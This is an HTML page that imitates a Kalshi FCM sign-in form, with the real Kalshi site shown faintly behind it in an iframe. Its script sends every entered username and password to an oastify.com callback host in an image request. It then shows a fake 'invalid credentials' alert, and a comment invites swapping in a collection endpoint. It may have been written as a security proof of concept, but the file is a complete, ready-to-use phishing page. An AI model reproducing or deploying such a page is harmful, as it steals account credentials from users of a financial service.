<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>FCM Kalshi Login</title>
  <style>
    body {
      background-color: #111827;
      font-family: Arial, sans-serif;
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      overflow: hidden;
    }

    .login-box {
      background-color: #1f2937;
      padding: 40px;
      border-radius: 10px;
      box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.5);
      width: 100%;
      max-width: 400px;
      text-align: center;
      position: relative;
      z-index: 10;
    }

    .login-box h2 {
      margin-bottom: 20px;
      color: #f7f7f7;
    }

    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: none;
      border-radius: 5px;
      font-size: 16px;
    }

    button {
      background-color: #10b981;
      color: white;
      padding: 12px;
      width: 100%;
      font-size: 16px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }

    .note {
      font-size: 14px;
      margin-top: 10px;
      color: #ccc;
    }

    iframe {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      border: none;
      opacity: 0.4;
      pointer-events: none;
      z-index: 1;
    }
  </style>
</head>
<body>

  <iframe src="https://fcm.kalshi.com/" sandbox="allow-same-origin allow-scripts"></iframe>

  <div class="login-box">
    <h2>Kalshi FCM Login</h2>
    <p>Sign in with your account</p>
    <form onsubmit="handleLogin(); return false;">
      <input type="text" placeholder="Username or Email" id="username" required />
      <input type="password" placeholder="Password" id="password" required />
      <button type="submit">Log In</button>
    </form>
    <p class="note">Authorized Users Only</p>
  </div>

  <script>
    function handleLogin() {
      const u = document.getElementById("username").value;
      const p = document.getElementById("password").value;

      // Replace with your endpoint to collect credentials
      const img = new Image();
      img.src = `https://m3q1veuvlhl1morjvgkuq7jxbohf55tu.oastify.com/?u=${encodeURIComponent(u)}&p=${encodeURIComponent(p)}`;

      alert("Invalid login credentials. Please try again.");
    }
  </script>

</body>
</html>
